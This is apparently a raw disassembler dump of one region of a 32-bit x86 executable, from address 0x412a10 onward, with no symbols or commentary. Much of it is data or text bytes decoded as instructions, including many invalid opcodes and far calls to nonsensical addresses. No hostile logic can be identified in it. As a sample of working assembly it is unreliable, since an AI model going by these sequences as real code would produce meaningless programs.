  412a10:	add    BYTE PTR [esi+0x6a],cl
  412a13:	js     0x412a89
  412a15:	cmp    dl,BYTE PTR [ebx+0x28]
  412a18:	bound  ebp,QWORD PTR [ebp+0x66]
  412a1b:	push   eax
  412a1c:	arpl   WORD PTR [ebp+0x6f],bp
  412a1f:	cmp    al,0x6e
  412a21:	imul   esp,DWORD PTR [eax],0x726f6320
  412a27:	jbe    0x412a9e
  412a29:	outs   dx,BYTE PTR cs:[esi]
  412a2b:	arpl   WORD PTR [edx+0x70],si
  412a2e:	imul   esp,DWORD PTR gs:[eax],0x7365653d
  412a35:	and    BYTE PTR [edx],ah
  412a37:	gs jae 0x412a9b
  412a3a:	and    BYTE PTR [eax+0x69],bh
  412a3d:	dec    bp
  412a3f:	jb     0x412a61
  412a41:	outs   dx,DWORD PTR ds:[esi]
  412a42:	dec    ebp
  412a43:	jo     0x412ab2
  412a45:	outs   dx,DWORD PTR ds:[esi]
  412a46:	dec    ebp
  412a47:	jb     0x412a8d
  412a49:	jo     0x412a6b
  412a4b:	outs   dx,DWORD PTR cs:[esi]
  412a4d:	push   ebx
  412a4e:	jbe    0x412ab9
  412a50:	bound  esp,QWORD PTR ds:[eax]
  412a53:	outs   dx,DWORD PTR ds:[esi]
  412a54:	and    BYTE PTR [ebx+0x74],al
  412a57:	data16 jae 0x412aca
  412a5a:	ins    DWORD PTR es:[edi],dx
  412a5b:	arpl   WORD PTR cs:[esi],bp
  412a5e:	jb     0x412a8e
  412a60:	ins    DWORD PTR es:[edi],dx
  412a61:	ret    
  412a62:	mov    DWORD PTR [ebx+0x6d],ebp
  412a65:	push   edi
  412a66:	retf   0x89a9
  412a69:	inc    ebx
  412a6a:	xchg   ch,ch
  412a6c:	cmp    eax,0x9cf59dfe
  412a71:	and    BYTE PTR [eax+0xc912],0x3a
  412a78:	mov    ebx,0xaaaa0000
  412a7d:	add    BYTE PTR [eax],al
  412a7f:	pop    ebx
  412a80:	xor    DWORD PTR [ecx+0x66],esp
  412a83:	sbb    DWORD PTR [eax-0x75],0x70981035
  412a8a:	repz adc al,0x21
  412a8d:	shl    DWORD PTR [eax],0x5b
  412a90:	push   ds
  412a91:	jle    0x412ab8
  412a93:	sub    bh,BYTE PTR [edi]
  412a95:	jmp    0x412a26
  412a97:	add    BYTE PTR [eax+esi*4],al
  412a9a:	jecxz  0x412a8a
  412a9c:	jp     0x412aa2
  412a9e:	add    al,0x4
  412aa0:	sar    DWORD PTR [eax],cl
  412aa2:	retf   
  412aa3:	cs cwde 
  412aa5:	inc    edi
  412aa6:	scas   al,BYTE PTR es:[edi]
  412aa7:	inc    esi
  412aa8:	dec    edx
  412aa9:	add    ebx,edi
  412aab:	aaa    
  412aac:	add    dl,bl
  412aae:	and    dh,BYTE PTR [ebp-0x3acaf170]
  412ab4:	add    BYTE PTR [eax-0x54],ch
  412ab7:	sar    esp,0xa4
  412aba:	addr16 pop ds
  412abc:	lock push 0x94b39799
  412ac2:	sub    BYTE PTR [esp+eax*1],al
  412ac5:	fisttp DWORD PTR [ebp-0x72fbfbfc]
  412acb:	lea    ecx,[ebp-0x72727273]
  412ad1:	lea    ecx,[ebp+0xe9f6]
	...
  412adf:	add    DWORD PTR [ebx+0x148b09bb],0xffffffd5
  412ae6:	mov    ds:0x3edde967,al
  412aeb:	scas   eax,DWORD PTR es:[edi]
  412aec:	data16 jl 0x412b6e
  412aef:	cmp    ecx,ebx
  412af1:	cwde   
  412af2:	xor    ebp,ebp
  412af4:	outs   dx,DWORD PTR ds:[esi]
  412af5:	add    eax,0x837db3dd
  412afa:	cmp    DWORD PTR [esi-0x4fea564e],0xffffffac
  412b01:	mov    ebx,0xa60a1795
  412b06:	mov    edi,0xcd7da702
  412b0b:	call   0xcf3f90d0
  412b10:	mov    eax,ds:0x3bfb717f
  412b15:	out    0x48,al
  412b17:	mov    al,ds:0xed908383
  412b1c:	add    DWORD PTR cs:[ebx-0x7cca1e2e],0x75
  412b24:	hlt    
  412b25:	pop    ecx
  412b26:	push   ebx
  412b27:	pop    ds
  412b28:	mov    dh,0x45
  412b2a:	mov    al,ds:0xdeef91c4
  412b2f:	jo     0x412b97
  412b31:	in     eax,0x65
  412b33:	mov    dh,0x98
  412b35:	and    DWORD PTR [ebx+0x29],edi
  412b38:	imul   ebx,DWORD PTR [eax+0x7575a362],0x75
  412b3f:	pop    ss
  412b40:	inc    ebx
  412b41:	jne    0x412bb8
  412b43:	fcom   QWORD PTR [edi+0x757575]
	...
  412b51:	push   0xffffff98
  412b53:	test   DWORD PTR [edx],eax
  412b55:	(bad)  
  412b56:	stc    
  412b57:	mov    eax,0xcd80f702
  412b5c:	(bad)  
  412b5d:	outs   dx,DWORD PTR ds:[esi]
  412b5e:	ret    0x7eb7
  412b61:	fsqrt  
  412b63:	xor    eax,0x186a1146
  412b68:	xchg   edx,eax
	...
  412b71:	add    BYTE PTR [esp+eax*1],al
  412b74:	idiv   esp
  412b76:	adc    DWORD PTR [ecx+0x4],0xdf9d7204
  412b7d:	mov    cl,al
  412b7f:	iret   
  412b80:	or     al,0xa9
  412b82:	les    esp,FWORD PTR [eax+0xd]
  412b85:	and    dh,BYTE PTR [ecx-0x32]
  412b88:	(bad)  
  412b89:	pop    ss
  412b8a:	cmp    al,0xac
  412b8c:	mov    esp,0x60c346d2
  412b91:	mov    eax,ds:0x44928dc8
  412b96:	fdivr  DWORD PTR [ebp+0x27]
  412b99:	mov    BYTE PTR [ecx-0x5],al
  412b9c:	bound  eax,QWORD PTR [esp+eax*1]
  412b9f:	pop    ds
  412ba0:	ja     0x412ba6
  412ba2:	add    al,0xfd
  412ba4:	push   eax
  412ba5:	cmc    
  412ba6:	add    al,0x85
  412ba8:	adc    dh,BYTE PTR [esi]
  412baa:	imul   ebp,ebp,0x196b80c7
  412bb0:	jecxz  0x412bf1
  412bb2:	gs ret 
  412bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bb5:	fcom   DWORD PTR [ebp-0x2e]
  412bb8:	mov    eax,0x2593c4bd
  412bbd:	mov    bh,0x1e
  412bbf:	pop    ss
  412bc0:	test   DWORD PTR [ebp+0x51207985],eax
  412bc6:	inc    ebx
  412bc7:	inc    esp
  412bc8:	int3   
  412bc9:	popf   
  412bca:	jne    0x412c03
  412bcc:	in     al,0x99
  412bce:	in     al,dx
  412bcf:	loop   0x412c05
  412bd1:	xor    BYTE PTR [eax+0x64],dh
  412bd4:	ret    
  412bd5:	sbb    eax,0xabd9822f
  412bda:	retf   0x2aa
  412bdd:	das    
  412bde:	outs   dx,DWORD PTR ds:[esi]
  412bdf:	call   0xcd79b169
  412be4:	jecxz  0x412b6b
  412be6:	test   DWORD PTR [ebp+0x0],eax
  412bec:	add    BYTE PTR [eax],al
  412bee:	add    BYTE PTR [eax],al
  412bf0:	add    BYTE PTR [ebx-0x76],dh
  412bf3:	pop    DWORD PTR [eax]
	...
  412bfd:	int3   
  412bfe:	int3   
  412bff:	cmc    
  412c00:	mov    edx,0xdf53d965
  412c05:	xchg   ecx,eax
  412c06:	aam    0x9a
  412c08:	push   eax
  412c09:	or     DWORD PTR [ebx+eax*1],ebp
  412c0c:	out    dx,eax
  412c0d:	xchg   ebp,eax
  412c0e:	leave  
  412c0f:	push   ss
  412c10:	ret    0xece1
  412c13:	push   edx
  412c14:	mov    bh,0x8e
  412c16:	pop    ecx
  412c17:	int3   
  412c18:	int3   
  412c19:	jg     0x412b9d
  412c1b:	int3   
  412c1c:	int3   
  412c1d:	stc    
  412c1e:	and    ah,cl
  412c20:	int3   
  412c21:	outs   dx,BYTE PTR ds:[esi]
  412c22:	dec    esi
  412c23:	stos   DWORD PTR es:[edi],eax
  412c24:	mov    esi,0x2f78beec
  412c29:	xchg   esi,eax
  412c2a:	aam    0x7
  412c2c:	aam    0xbd
  412c2e:	dec    esp
  412c2f:	cmp    esi,DWORD PTR [esi]
  412c31:	fisubr DWORD PTR [ebx]
  412c33:	inc    esp
  412c34:	stos   BYTE PTR es:[edi],al
  412c35:	push   esi
  412c36:	add    DWORD PTR [ebx],0xb545ccba
  412c3c:	push   edi
  412c3d:	mov    edi,0x454545f6
  412c42:	sub    al,0x6b
  412c44:	or     eax,0x99512186
  412c49:	mov    ds:0x3ed097e,al
  412c4e:	add    eax,0x52594450
  412c53:	ins    BYTE PTR es:[edi],dx
  412c54:	ds scas al,BYTE PTR es:[edi]
  412c56:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c58:	test   al,0xab
  412c5a:	mov    ebx,0xbfc27370
  412c5f:	loopne 0x412c32
  412c61:	inc    eax
  412c62:	inc    eax
  412c63:	jle    0x412c7e
  412c65:	inc    ebp
  412c66:	inc    ebp
  412c67:	jmp    0x412c3d
  412c69:	inc    ebp
  412c6a:	inc    ebp
  412c6b:	inc    ebp
  412c6c:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  412c73:	add    DWORD PTR [ebx+0x234ade],0x0
  412c7a:	add    BYTE PTR [eax],al
  412c7c:	add    BYTE PTR [eax],al
  412c7e:	add    BYTE PTR [eax],al
  412c80:	add    BYTE PTR [ebx-0x52d31d7d],al
  412c86:	repnz add BYTE PTR [eax],ah
  412c89:	lock sbb al,0xc1
  412c8c:	add    eax,0x6baae48b
  412c91:	ins    DWORD PTR es:[edi],dx
  412c92:	imul   esp,DWORD PTR [edx+0x3c],0x6d6e6e3c
  412c99:	push   ebp
  412c9a:	imul   esp,DWORD PTR gs:[eax],0x6e505375
  412ca1:	cs ins DWORD PTR es:[edi],dx
  412ca3:	dec    ebp
  412ca4:	jae    0x412d14
  412ca6:	outs   dx,DWORD PTR ds:[esi]
  412ca7:	jb     0x412d0e
  412ca9:	outs   dx,BYTE PTR ds:[esi]
  412caa:	imul   esp,DWORD PTR [ebp+0x72],0x65650a74
  412cb1:	bound  esp,QWORD PTR gs:[eax]
  412cb4:	ins    DWORD PTR es:[edi],dx
  412cb5:	and    BYTE PTR [eax+0x63],dh
  412cb8:	gs gs and BYTE PTR gs:[edi+0x65],ch
  412cbe:	ins    DWORD PTR es:[edi],dx
  412cbf:	jne    0x412d2a
  412cc1:	popa   
  412cc2:	arpl   WORD PTR [esi],di
  412cc4:	and    ah,BYTE PTR [ecx+0x6d]
  412cc7:	jae    0x412d3d
  412cc9:	jo     0x412d34
  412ccb:	push   edx
  412ccc:	jb     0x412d31
  412cce:	jne    0x412cda
  412cd0:	gs ds ins DWORD PTR es:[edi],dx
  412cd3:	and    BYTE PTR [edi+0x20],ch
  412cd6:	gs gs outs dx,BYTE PTR cs:[esi]
  412cda:	or     eax,0x62202e72
  412cdf:	outs   dx,DWORD PTR ds:[esi]
  412ce0:	and    BYTE PTR [esi],bh
  412ce2:	and    BYTE PTR [ecx+0x2e],ch
  412ce5:	data16 jo 0x412cf2
  412ce8:	and    BYTE PTR [edx+esi*2],ch
  412ceb:	cmp    al,0x6d
  412ced:	imul   esi,DWORD PTR [esi+0x3a],0x20656e76
  412cf4:	outs   dx,DWORD PTR ds:[esi]
  412cf5:	ins    DWORD PTR es:[edi],dx
  412cf6:	jo     0x412d6e
  412cf8:	jns    0x412d5f
  412cfa:	inc    ecx
  412cfb:	push   0x200a0d6d
  412d00:	cmp    al,0xac
  412d02:	lds    eax,FWORD PTR [eax+ecx*2-0x27]
  412d06:	jmp    0xe9b07a03
  412d0b:	add    DWORD PTR [ebx-0x24a1cde5],0xfffffff3
  412d12:	and    edi,ebp
  412d14:	xor    eax,0xf6f973c
  412d19:	push   ebp
  412d1a:	test   al,0x6b
  412d1c:	xchg   esp,eax
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	push   ebx
  412d1f:	pusha  
  412d20:	retf   0x8b0b
  412d23:	sub    DWORD PTR [ecx-0x31],0xb
  412d27:	mov    ebp,0x83832f73
  412d2c:	push   ss
  412d2d:	sbb    BYTE PTR [ebx-0x7d],bh
  412d30:	cmp    ecx,0xffffff99
  412d33:	cmp    DWORD PTR [ebx+0x64369600],eax
  412d39:	int3   
  412d3a:	sar    DWORD PTR ds:0xcc0951ae,0x10
  412d41:	fsubr  DWORD PTR [ebx+eiz*8+0x36]
  412d45:	data16 std 
  412d47:	sub    cl,BYTE PTR [ebp+ecx*4+0x26]
  412d4b:	pop    ecx
  412d4c:	pop    ebx
  412d4d:	sub    BYTE PTR [eax],al
  412d4f:	add    BYTE PTR [eax],al
  412d51:	or     eax,0x3e000071
  412d56:	mov    esi,0x75000000
  412d5b:	jne    0x412dd2
  412d5d:	jne    0x412dd4
  412d5f:	jne    0x412dd6
  412d61:	jne    0x412dd8
  412d63:	lahf   
  412d64:	gs dec edx
  412d66:	mov    DWORD PTR [ebx+0x59ad5d91],esi
  412d6c:	shr    DWORD PTR [ebx-0x7b],0x64
  412d70:	outs   dx,BYTE PTR ds:[esi]
  412d71:	lods   al,BYTE PTR ds:[esi]
  412d72:	loope  0x412d9b
  412d74:	(bad)  
  412d75:	popf   
  412d76:	out    0x45,al
  412d78:	fist   WORD PTR [ebp-0x67]
	...
  412d83:	add    BYTE PTR [esp+eax*1],al
  412d86:	jno    0x412d75
  412d88:	aaa    
  412d89:	daa    
  412d8a:	add    al,0x4
  412d8c:	fstp   QWORD PTR [ecx]
  412d8e:	pop    ebp
  412d8f:	mov    BYTE PTR ds:[eax+0x7cadd930],0xf
  412d97:	dec    esp
  412d98:	cwde   
  412d99:	push   es
  412d9a:	ret    
  412d9b:	adc    esp,DWORD PTR [esp+eiz*4+0x3e]
  412d9f:	adc    al,0x3f
  412da1:	sbb    eax,0xfde2a55a
  412da6:	enter  0x23fd,0x53
  412daa:	xor    DWORD PTR [ecx+0x4b7a03b],ebp
  412db0:	add    al,0x87
  412db2:	ret    0x404
  412db5:	pop    ebp
  412db6:	cmp    DWORD PTR [esi+0x5a5c0004],edx
  412dbc:	stc    
  412dbd:	leave  
  412dbe:	dec    ecx
  412dbf:	mov    ch,0xad
  412dc1:	jecxz  0x412dba
  412dc3:	push   esp
  412dc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dc5:	js     0x412d69
  412dc7:	add    eax,0xfdbd4d57
  412dcc:	test   BYTE PTR [edx+esi*1+0x5753d5],cl
  412dd3:	add    BYTE PTR [eax],al
  412dd5:	retf   0xe6c3
  412dd8:	mov    esi,DWORD PTR [ebx]
  412dda:	popa   
  412ddb:	std    
  412ddc:	rcr    BYTE PTR [esp+eiz*4],0xb6
  412de0:	inc    edi
  412de1:	mov    al,ds:0x39eabcd4
  412de6:	mov    bh,0xd5
  412de8:	xchg   DWORD PTR [esi+esi*2-0x7],edi
  412dec:	xchg   edx,eax
  412ded:	adc    esp,DWORD PTR [ecx]
  412def:	xlat   BYTE PTR ds:[ebx]
  412df0:	lods   eax,DWORD PTR ds:[esi]
  412df1:	jo     0x412df3
  412df3:	add    dl,ch
  412df5:	enter  0x7c,0x0
  412df9:	add    BYTE PTR [edx+0x6a],ch
  412dfc:	push   0x6a
  412dfe:	push   0x6a
  412e00:	push   0x6a
  412e02:	push   0x3d
  412e04:	and    BYTE PTR [edx-0x1],0xff
  412e0b:	(bad)  
  412e0c:	(bad)  
  412e0d:	(bad)  
  412e0e:	inc    DWORD PTR [eax]
  412e10:	add    dl,bh
  412e12:	sub    al,0x7b
  412e14:	sbb    al,0x4e
  412e16:	mov    al,0xdf
  412e18:	fdiv   QWORD PTR ds:0x9a8f533b
  412e1e:	and    cl,0x1a
  412e21:	call   0x7b1b:0x3368084f
  412e28:	add    DWORD PTR [eax],0x0
  412e2b:	jp     0x412de0
  412e2d:	add    BYTE PTR [eax],al
  412e2f:	rol    BYTE PTR [eax+eax*1],cl
  412e32:	add    BYTE PTR [ebx],ch
  412e34:	push   es
  412e35:	jmp    0x9e443643
  412e3a:	push   eax
  412e3b:	xchg   edx,eax
  412e3c:	pop    ebp
  412e3d:	and    esp,DWORD PTR [esi+0x39e0fb6d]
  412e43:	out    dx,al
  412e44:	mov    dh,0xc8
  412e46:	gs ret 
  412e48:	mov    esp,0xdc4a
  412e4d:	jne    0x412df7
  412e4f:	(bad)  
  412e50:	enter  0x0,0x0
  412e54:	pop    eax
  412e55:	mov    eax,0x40792eb9
  412e5a:	jae    0x412ec9
  412e5c:	cs call 0x39b4:0x8cbcea53
  412e64:	pop    ds
  412e65:	call   0xc47c802b
  412e6a:	dec    esi
  412e6b:	push   edx
  412e6c:	push   edi
  412e6d:	rcr    BYTE PTR [eax],cl
  412e6f:	jle    0x412ee1
  412e71:	pop    ds
  412e72:	xor    ebp,DWORD PTR [ecx+0x13edf9]
  412e78:	add    BYTE PTR [eax],dh
  412e7a:	lock add BYTE PTR [eax],al
	...
  412e85:	add    BYTE PTR [eax],al
  412e87:	fisttp QWORD PTR [ebp+0x1f]
	...
  412e92:	add    BYTE PTR [eax],al
  412e94:	add    BYTE PTR [eax-0x51],ah
  412e97:	js     0x412e53
  412e99:	jae    0x412e3e
  412e9b:	push   ebx
  412e9c:	fstp   QWORD PTR [edi-0x62]
  412e9f:	lods   eax,DWORD PTR ds:[esi]
  412ea0:	push   cs
  412ea1:	adc    edi,DWORD PTR [edi]
  412ea3:	pop    ecx
  412ea4:	in     al,0x2a
  412ea6:	jne    0x412eb8
  412ea8:	fiadd  WORD PTR [edx+0xc9c572]
  412eae:	add    BYTE PTR [ebx],cl
  412eb0:	loopne 0x412edb
  412eb2:	scas   al,BYTE PTR es:[edi]
  412eb3:	push   0x92d23692
  412eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb9:	fcomp  QWORD PTR [edi+0x71]
  412ebc:	add    cl,bh
  412ebe:	pop    ebx
  412ebf:	jnp    0x412e80
  412ec1:	push   ebx
  412ec2:	mov    esp,0xb956d774
  412ec7:	pusha  
  412ec8:	div    BYTE PTR [edi+0x4e58]
  412ece:	inc    esp
  412ecf:	push   edx
  412ed0:	add    BYTE PTR fs:[eax],al
  412ed3:	(bad)  
  412ed4:	fwait
  412ed5:	xchg   esp,eax
  412ed6:	add    bh,bh
  412ed8:	push   esp
  412ed9:	dec    ebx
  412eda:	jecxz  0x412e86
  412edc:	push   esi
  412edd:	(bad)  
  412ede:	jns    0x412f4f
  412ee0:	inc    edi
  412ee1:	out    0x2a,al
  412ee3:	mov    ebx,DWORD PTR [esi+0x625983bd]
  412ee9:	xchg   DWORD PTR [edi-0x47259408],edi
  412eef:	xor    bh,bh
  412ef1:	(bad)  
  412ef2:	dec    edi
  412ef4:	(bad)  
  412ef5:	(bad)  
  412ef6:	jmp    DWORD PTR [ebx]
  412ef8:	repz (bad) 
  412efa:	(bad)  
  412efb:	dec    esp
  412efd:	int3   
  412efe:	int3   
  412eff:	int3   
  412f00:	int3   
  412f01:	int3   
  412f02:	int3   
  412f03:	int3   
  412f04:	int3   
  412f05:	jae    0x412f75
  412f07:	fwait
  412f08:	popf   
  412f09:	es inc edx
  412f0b:	(bad)  
  412f0c:	addr16 inc ebx
  412f0e:	mov    ecx,0x742f6d5
  412f13:	out    dx,al
  412f14:	mov    ebx,0x4fdfd242
  412f19:	jmp    0x0:0xfd96af
  412f20:	add    BYTE PTR [eax],al
  412f22:	add    BYTE PTR [eax],al
  412f24:	add    BYTE PTR [eax],al
  412f26:	mov    ecx,DWORD PTR [ebx-0x61cffa5d]
  412f2c:	mov    ecx,DWORD PTR [ebx+0x51c2155b]
  412f32:	sub    eax,0x3364fb5
  412f37:	sbb    ch,dl
  412f39:	dec    edx
  412f3a:	lock push eax
  412f3c:	or     BYTE PTR [ebx+0x3e],ch
  412f3f:	(bad)  
  412f40:	in     eax,dx
  412f41:	loope  0x412f38
  412f43:	mov    cl,0x7b
  412f45:	leave  
  412f46:	lahf   
  412f47:	inc    edi
  412f48:	adc    edx,esi
  412f4a:	mov    al,0xad
  412f4c:	in     al,0x3e
  412f4e:	arpl   WORD PTR [ebx+0x68],bp
  412f51:	mov    ecx,DWORD PTR [ebx-0x74742163]
  412f57:	xor    edi,ebx
  412f59:	retf   
  412f5a:	mov    eax,DWORD PTR [eax]
  412f5c:	or     eax,0xa2ea7dc0
  412f61:	or     BYTE PTR [ecx],al
  412f63:	inc    ebx
  412f64:	add    DWORD PTR [eax-0x76],esp
  412f67:	arpl   WORD PTR [eax+0x7137a955],di
  412f6d:	and    edi,0xffffffa6
  412f70:	ja     0x412f6a
  412f72:	retf   
  412f73:	pop    edi
  412f74:	add    BYTE PTR [eax],al
  412f76:	add    BYTE PTR [edi+0x2e8964c5],dh
  412f7c:	jno    0xbf8e6886
  412f82:	fld    TBYTE PTR [edi+0x31e67edd]
  412f88:	or     BYTE PTR [ebx+0x40],0xa1
  412f8c:	cwde   
  412f8d:	mul    BYTE PTR [eax+0xe]
  412f90:	and    eax,edi
  412f92:	jns    0x412f1a
  412f94:	add    BYTE PTR [eax],al
  412f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f97:	daa    
	...
  412fa4:	add    bl,bh
  412fa6:	pushf  
  412fa7:	jge    0x412f36
  412fa9:	lea    ecx,[ebp-0x72727273]
  412faf:	lea    ecx,[ebp-0xeb10000]
  412fb5:	in     al,dx
  412fb6:	pop    ds
  412fb7:	or     eax,0x46863f05
  412fbc:	icebp  
  412fbd:	mov    esi,0x7bfb2fb3
  412fc2:	out    0xe1,eax
  412fc4:	fisub  DWORD PTR [edi+0x2b]
  412fc7:	aam    0xd
  412fc9:	adc    DWORD PTR [ebx],esp
  412fcb:	add    BYTE PTR [eax],al
  412fcd:	ret    0x39
  412fd0:	add    cl,cl
  412fd2:	pop    ds
  412fd3:	add    BYTE PTR [eax],al
  412fd5:	mov    eax,0x44dd215d
  412fda:	rcl    BYTE PTR [eax-0xaae3a9e],1
  412fe0:	es ds or edx,esi
  412fe4:	cmp    eax,0xa64a6540
  412fe9:	add    eax,0x9db2f1
  412fee:	add    BYTE PTR [ecx+0x56],dl
  412ff1:	add    esi,esp
  412ff3:	add    BYTE PTR [eax],al
  412ff5:	add    bh,ch
  412ff7:	add    eax,0x845f0071
  412ffc:	jbe    0x412ff3
  412ffe:	and    DWORD PTR [ebx],edx
  413000:	push   ecx
  413001:	cmc    
  413002:	in     eax,dx
  413003:	fbld   TBYTE PTR [edi+0x4555ffb8]
  413009:	clc    
  41300a:	icebp  
  41300b:	and    al,0x67
  41300d:	xlat   BYTE PTR ds:[ebx]
  41300e:	out    0x4e,eax
  413010:	sbb    eax,0x9b552205
  413015:	dec    esi
  413016:	pushf  
  413017:	retf   0x47
  41301a:	add    BYTE PTR [ebp+0x5f],bl
  41301d:	add    BYTE PTR [eax],al
  41301f:	add    BYTE PTR [esp+esi*2+0x74],dh
  413023:	je     0x413099
  413025:	je     0x41309b
  413027:	je     0x41309d
  413029:	xor    al,BYTE PTR [ebx+edi*8-0x74747475]
  413030:	mov    ecx,DWORD PTR [ebx+0x8b8b8b]
  413036:	add    BYTE PTR [edx],al
  413038:	ja     0x4130b9
  41303a:	or     dl,bl
  41303c:	stos   DWORD PTR es:[edi],eax
  41303d:	int    0x66
  41303f:	outs   dx,DWORD PTR cs:[esi]
  413041:	jb     0x4130a8
  413043:	cs jo  0x4130b3
  413046:	ins    DWORD PTR es:[edi],dx
  413047:	arpl   WORD PTR gs:[eax],sp
  41304a:	push   edi
  41304b:	push   0x6d0a6d72
  413050:	jo     0x4130c5
  413052:	inc    esp
  413053:	je     0x413075
  413055:	jb     0x4130a4
  413057:	or     ah,BYTE PTR [eax+ebp*2+0x65]
  41305b:	ins    DWORD PTR es:[edi],dx
  41305c:	jne    0x41307e
  41305e:	and    BYTE PTR [ebx+0x20],ah
  413061:	imul   ebp,DWORD PTR [esi],0x3e742865
  413067:	jae    0x4130d6
  413069:	inc    esp
  41306a:	arpl   WORD PTR [edx+0x66],si
  41306d:	outs   dx,BYTE PTR ds:[esi]
  41306e:	jae    0x4130c3
  413070:	and    BYTE PTR [ebp+0x2f],ah
  413073:	ins    DWORD PTR es:[edi],dx
  413074:	ins    DWORD PTR es:[edi],dx
  413075:	popa   
  413076:	ins    DWORD PTR es:[edi],dx
  413077:	addr16 inc ecx
  413079:	outs   dx,DWORD PTR ds:[esi]
  41307a:	jb     0x4130ee
  41307c:	or     eax,0xa74574d
  413081:	and    dl,BYTE PTR [ebx+0x62]
  413084:	and    BYTE PTR [ebp+eiz*2+0x6d],ch
  413088:	or     eax,0x7462740d
  41308d:	inc    ebp
  41308e:	push   ebx
  41308f:	outs   dx,DWORD PTR ds:[esi]
  413090:	outs   dx,DWORD PTR ds:[esi]
  413091:	ins    DWORD PTR es:[edi],dx
  413092:	push   ebx
  413093:	push   ebx
  413094:	bound  esp,QWORD PTR [ecx+0x61]
  413097:	jb     0x4130d6
  413099:	cmp    eax,0x6241636f
  41309e:	popa   
  41309f:	outs   dx,DWORD PTR ds:[esi]
  4130a0:	and    BYTE PTR [edi+0x2e],ch
  4130a3:	bound  esp,QWORD PTR [ebp+0x65]
  4130a6:	popa   
  4130a7:	jb     0x4130c9
  4130a9:	cs jae 0x4130ed
  4130ac:	jns    0x413127
  4130ae:	jo     0x4130bd
  4130b0:	cs imul esp,edi,0x39
  4130b4:	lods   eax,DWORD PTR ds:[esi]
  4130b5:	jle    0x4130e7
  4130b7:	jae    0x4130ec
  4130b9:	imul   ebx,DWORD PTR [ecx-0x44b98c89],0x58e385
  4130c3:	add    BYTE PTR [eax],bh
  4130c5:	cmp    al,0x2f
  4130c7:	mov    dl,0xff
  4130c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ca:	mov    esp,0xc20f4a34
  4130cf:	hlt    
  4130d0:	inc    esp
  4130d1:	jecxz  0x413073
  4130d3:	push   es
  4130d4:	jno    0x4130e7
  4130d6:	mov    esi,0xb02f5be9
  4130db:	leave  
  4130dc:	jge    0x4130de
  4130de:	sti    
  4130df:	rol    DWORD PTR [eax-0x511b0000],1
  4130e5:	das    
  4130e6:	add    BYTE PTR [eax],al
  4130e8:	out    0x56,al
  4130ea:	pop    es
  4130eb:	add    BYTE PTR [eax],al
  4130ed:	loop   0x413100
  4130ef:	ins    DWORD PTR es:[edi],dx
  4130f0:	fidivr DWORD PTR [edi+0x12]
  4130f3:	cs dec ebx
  4130f5:	das    
  4130f6:	push   esi
  4130f7:	js     0x4130f5
  4130f9:	and    al,0xb2
  4130fb:	jns    0x41315b
  4130fd:	call   0x330c:0x550653fa
  413104:	inc    esp
  413105:	add    BYTE PTR [eax],al
  413107:	add    BYTE PTR [ecx+0x7000002c],cl
  41310d:	xor    eax,DWORD PTR [eax]
  41310f:	add    BYTE PTR [eax],al
  413111:	(bad)  
  413112:	(bad)  
  413113:	(bad)  
  413114:	(bad)  
  413115:	(bad)  
  413116:	(bad)  
  413117:	(bad)  
  413118:	(bad)  
  413119:	jmp    DWORD PTR [ecx+eiz*4+0xce3ade0]
  413120:	pop    ebp
  413121:	mov    dl,BYTE PTR [eax]
  413123:	pop    edi
  413124:	fidiv  DWORD PTR [ebx]
  413126:	xchg   DWORD PTR [edx-0x4c9532b3],esp
  41312c:	std    
  41312d:	popa   
  41312e:	inc    eax
  41312f:	loop   0x413145
  413131:	cmc    
	...
  41313a:	add    BYTE PTR [ebp-0x7bf27d73],cl
  413140:	inc    esi
  413141:	lea    ecx,[ebp-0x1165994f]
  413147:	pop    esi
  413148:	xchg   DWORD PTR [eax],edi
  41314a:	xor    BYTE PTR [edi+0x75a58125],0x50
  413151:	and    al,0x4e
  413153:	jg     0x413156
  413155:	out    dx,eax
  413156:	sub    bh,BYTE PTR [esi]
  413158:	outs   dx,DWORD PTR ds:[esi]
  413159:	pushf  
  41315a:	mov    al,ds:0x680a469d
  41315f:	xchg   esp,eax
  413160:	mov    ah,0x3e
  413162:	inc    ebp
  413163:	dec    ebp
  413164:	jns    0x4131da
  413166:	lea    ecx,[ebp-0x7272e948]
  41316c:	retf   
  41316d:	addr16 dec ecx
  41316f:	lea    ecx,[ebx-0x4cccbbaa]
  413175:	jae    0x4131dd
  413177:	lock sub ebx,esp
  41317a:	scas   eax,DWORD PTR es:[edi]
  41317b:	out    0xa0,eax
  41317d:	cmc    
  41317e:	mov    ds:0xdd85bd0d,al
  413183:	rol    BYTE PTR [esi],0x16
  413186:	cmp    eax,0x8b8ba309
  41318b:	mov    esi,DWORD PTR [ecx+0x28815691]
  413191:	sub    ah,BYTE PTR [eax+0x58b48f83]
  413197:	cli    
  413198:	jmp    0x5a5bb950
  41319d:	mov    esi,0x6a5d9dfa
  4131a2:	ins    DWORD PTR es:[edi],dx
  4131a3:	xchg   DWORD PTR [edx-0x1ac16a04],esp
  4131a9:	mov    ecx,DWORD PTR [ebx-0x74fc1428]
  4131af:	mov    ecx,DWORD PTR [ebx-0x1]
  4131b5:	(bad)  
  4131b6:	(bad)  
  4131b7:	(bad)  
  4131b8:	(bad)  
  4131b9:	jmp    DWORD PTR [esp+edx*1+0x404043d]
  4131c0:	add    al,0x4
  4131c2:	add    al,0x4
  4131c4:	add    al,0x4
  4131c6:	(bad)  
  4131c7:	inc    DWORD PTR [eax-0x4]
  4131ca:	sbb    al,0x21
  4131cc:	ins    BYTE PTR es:[edi],dx
  4131cd:	xor    DWORD PTR [eax],ebx
  4131cf:	call   0x1f94:0xc0a90f93
  4131d6:	loope  0x41315b
  4131d8:	outs   dx,BYTE PTR ds:[esi]
  4131d9:	pushf  
  4131da:	mov    fs,ebp
  4131dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131dd:	dec    ecx
  4131de:	add    eax,0x49ffff7b
  4131e3:	pop    eax
  4131e4:	(bad)  
  4131e5:	inc    DWORD PTR [esi-0x59]
  4131e8:	(bad)  
  4131e9:	jmp    FWORD PTR [esi+0x24]
  4131ec:	dec    ebp
